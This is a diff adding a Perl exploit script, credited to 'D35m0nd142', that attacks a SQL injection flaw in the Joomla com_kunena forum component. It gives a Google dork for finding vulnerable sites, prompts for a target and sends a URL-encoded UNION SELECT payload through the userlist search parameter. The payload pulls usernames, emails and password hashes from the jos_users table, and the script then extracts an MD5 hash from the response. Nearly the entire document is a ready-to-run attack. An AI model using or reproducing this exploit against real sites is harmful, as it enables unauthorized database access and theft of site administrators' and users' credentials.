@@ -1,0 +1,29 @@
+#!/usr/bin/perl 
+#Exploit title: Joomla Component com_kunena SQL Injection exploit 
+#Google Dork: inurl:index.php?option=com_kunena&
+#Exploit Author: D35m0nd142
+#Screenshot : http://imageshack.us/f/155/comkunena2.png/
+#Vendor HomePage: http://www.joomla.org/ 
+#Special thanks to Taurusomar
+system("clear");
+print "*********************************************\n";
+print "* Joomla Component com_kunena SQL Injection *\n";
+print "*      Coded by D35m0nd142                  *\n";
+print "*********************************************\n";
+sleep 1;
+use LWP::UserAgent;
+print "Enter the target --> ";
+chomp(my $target=<STDIN>);
+$code="%25%27%20and%201=2%29%20union%20select%201,%20concat%280x3a,username,0x3a,email,0x3a,0x3a,activation%29,concat%280x3a,username,0x3a,email,0x3a,password,0x3a,activation%29,%27Super%20Administrator%27,%27email%27,%272009-11-26%2022:09:28%27,%272009-11-26%2022:09:28%27,62,1,1,0,0,0,1,15%20from%20jos_users--%20;";
+$agent = LWP::UserAgent->new() or die "[!] Error while processing";
+$agent->agent('Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.12011');
+$host= $target. "/index.php?option=com_kunena&func=userlist&search=".$code;
+$ok = $agent->request(HTTP::Request->new(GET=>$host));
+$ok1 = $ok->content; if ($ok1 =~/([0-9a-fA-F]{32})/){
+print "[+] Password found --> $1\n$2\n";
+sleep 1;
+}
+else
+{
+print "Password not found \n";
+}
